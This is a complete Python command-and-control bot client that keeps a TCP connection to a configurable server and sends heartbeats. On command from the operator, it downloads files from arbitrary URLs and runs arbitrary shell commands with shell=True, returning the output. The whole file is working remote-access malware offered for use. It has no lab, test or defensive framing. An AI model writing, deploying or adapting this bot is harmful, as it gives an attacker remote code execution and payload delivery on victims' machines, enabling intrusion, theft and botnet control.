#!/usr/bin/env python3
import socket
import threading
import time
import sys
import subprocess
import requests
import os

# ===== CONFIG =====
SERVER_IP = '127.0.0.1'  # Change this
SERVER_PORT = 9000
HEARTBEAT_INTERVAL = 10  # seconds
BUFFER_SIZE = 4096       # bytes to read at once

# ===== BOT LOGIC =====

class C2Bot:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.sock = None
        self.running = True

    def connect(self):
        """Establish TCP connection to server."""
        try:
            self.sock = socket.create_connection((self.server_ip, self.server_port))
            print(f"[+] Connected to {self.server_ip}:{self.server_port}")
        except Exception as e:
            print(f"[!] Failed to connect: {e}")
            sys.exit(1)

    def start(self):
        """Start the main bot loop."""
        self.connect()

        # Start thread for heartbeats
        heartbeat_thread = threading.Thread(target=self.send_heartbeat_loop, daemon=True)
        heartbeat_thread.start()

        # Start receiving commands
        try:
            self.receive_commands()
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user.")
        finally:
            self.cleanup()

    def send_heartbeat_loop(self):
        """Send heartbeat every HEARTBEAT_INTERVAL seconds."""
        while self.running:
            try:
                self.sock.sendall(b'HEARTBEAT\n')
                print("[>] Sent HEARTBEAT")
            except Exception as e:
                print(f"[!] Failed to send HEARTBEAT: {e}")
                self.running = False
                break
            time.sleep(HEARTBEAT_INTERVAL)

    def receive_commands(self):
        """Receive and handle commands from server."""
        buffer = b""
        while self.running:
            try:
                data = self.sock.recv(BUFFER_SIZE)
                if not data:
                    print("[!] Server closed connection.")
                    break

                buffer += data
                while b'\n' in buffer:
                    line, buffer = buffer.split(b'\n', 1)
                    command = line.decode(errors='ignore').strip()
                    print(f"[<] Received command: {command}")

                    self.handle_command(command)

            except Exception as e:
                print(f"[!] Error receiving data: {e}")
                break

        self.running = False

    def handle_command(self, command):
        """Dispatch incoming commands."""
        if not command:
            return

        if command == "PING":
            self.send_response("PONG")

        elif command.startswith("DOWNLOAD "):
            parts = command.split(" ", 2)
            if len(parts) == 3:
                url, filename = parts[1], parts[2]
                self.download_file(url, filename)
            else:
                self.send_response("DOWNLOAD_FAIL invalid_format")

        elif command.startswith("EXECUTE "):
            shell_command = command[len("EXECUTE "):]
            self.execute_command(shell_command)

        else:
            print(f"[!] Unknown command: {command}")
            self.send_response(f"UNKNOWN_COMMAND {command}")

    def download_file(self, url, filename):
        """Download a file from a URL and save locally."""
        try:
            response = requests.get(url, timeout=15)
            response.raise_for_status()

            with open(filename, 'wb') as f:
                f.write(response.content)

            self.send_response(f"DOWNLOAD_SUCCESS {filename}")
            print(f"[>] Downloaded and saved as {filename}")

        except Exception as e:
            self.send_response(f"DOWNLOAD_FAIL {filename}")
            print(f"[!] Download failed for {url}: {e}")

    def execute_command(self, shell_command):
        """Execute an OS command and send back the result."""
        try:
            output = subprocess.check_output(shell_command, shell=True, stderr=subprocess.STDOUT, timeout=15)
            result = output.decode(errors='ignore').strip()
            print(f"[>] Command output: {result}")

            # Limit output size
            result = (result[:500] + '...') if len(result) > 500 else result
            self.send_response(f"EXECUTE_RESULT {result}")

        except subprocess.CalledProcessError as e:
            error_output = e.output.decode(errors='ignore').strip()
            self.send_response(f"EXECUTE_ERROR {error_output}")
            print(f"[!] Command execution error: {error_output}")

        except Exception as e:
            self.send_response(f"EXECUTE_ERROR {str(e)}")
            print(f"[!] Unknown execution error: {e}")

    def send_response(self, message):
        """Send a message back to the server."""
        try:
            full_message = f"{message}\n".encode()
            self.sock.sendall(full_message)
            print(f"[>] Sent response: {message}")
        except Exception as e:
            print(f"[!] Failed to send response: {e}")
            self.running = False

    def cleanup(self):
        """Close connection and clean up."""
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
        print("[*] Disconnected. Bot stopped.")

# ===== MAIN =====

if __name__ == "__main__":
    bot = C2Bot(SERVER_IP, SERVER_PORT)
    bot.start()
